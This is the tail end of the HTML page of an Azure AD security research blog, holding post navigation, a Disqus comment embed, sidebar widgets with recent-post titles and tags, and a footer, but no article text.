	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/pta-deepdive/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Deep-dive to Azure AD Pass-Through Authentication</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/azurevms/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Getting root access to Azure VMs as a Azure AD Global Administrator</p></a>
	</div>
</nav>

	
<div class="comments">
	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

</main>

<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
	
<div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
		<label>
			<span class="screen-reader-text">Search for:</span>
			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
		</label>
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
	</form>
</div>
	
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
		</ul>
	</div>
</div>

	
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
		</ul>
	</div>
</div>
	
<div class="widget-social widget">
	<h4 class="widget-social__title widget__title">Social</h4>
	<div class="widget-social__content widget__content">
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
				<span>Twitter</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
				<span>LinkedIn</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
				<span>nestori.syynimaa@gerenios.com</span>
			</a>
		</div>
	</div>
</div>

	
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
	</div>
</div>
</aside>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
